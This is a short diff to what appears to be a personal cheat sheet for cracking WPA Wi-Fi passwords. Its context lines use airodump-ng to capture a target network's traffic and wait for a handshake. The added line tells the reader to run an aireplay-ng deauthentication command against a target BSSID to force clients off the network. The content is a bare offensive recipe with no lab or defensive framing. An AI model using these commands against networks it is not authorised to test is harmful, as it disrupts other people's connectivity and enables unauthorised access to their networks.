@@ -7,5 +7,6 @@ airodump-ng -M wlan0mon
 airodump-ng -M wlan0mon --bssid (bssid) -c (chanel) -w (filename to save)
 
 !!!!!wait for wpa handshake
+!!!!! run this on another terminal "aireplay-ng --deauth 10 -a <BSSID> -D wlan0"
 
 
